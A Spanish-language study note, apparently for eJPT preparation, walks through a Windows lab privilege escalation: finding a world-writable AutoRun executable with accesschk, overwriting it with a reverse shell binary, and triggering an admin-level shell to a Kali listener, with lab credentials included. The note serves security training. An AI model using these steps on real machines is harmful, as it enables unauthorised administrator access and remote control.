- Consulta el registro de ejecutables de AutoRun:

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

- Usando accesschk.exe, tenga en cuenta que uno de los ejecutables de AutoRun es escribible por todos:

```
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

```
- Copie el ejecutable reverse.exe que creó y sobrescriba el ejecutable AutoRun con él:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

- Inicie un oyente en Kali y luego reinicie Windows VM. Abre un nuevo PDR sesión para activar un shell inverso que se ejecuta con privilegios de administrador. No debería tener que autenticarse para activarlo, sin embargo, si la carga útil no se dispara, inicie sesión como administrador (admin/password123) para activarlo. ¡Tenga en cuenta que en un compromiso del mundo real, tendría que esperar a que un administrador inicie sesión por sí mismo!  

```
rdesktop 10.10.226.103
```

enlace:
[[Preparacion-Ejpt]]
[[Herramientas]]
[[Registry - AlwaysInstallElevated]]
[[Generate a Reverse Shell Executable]]
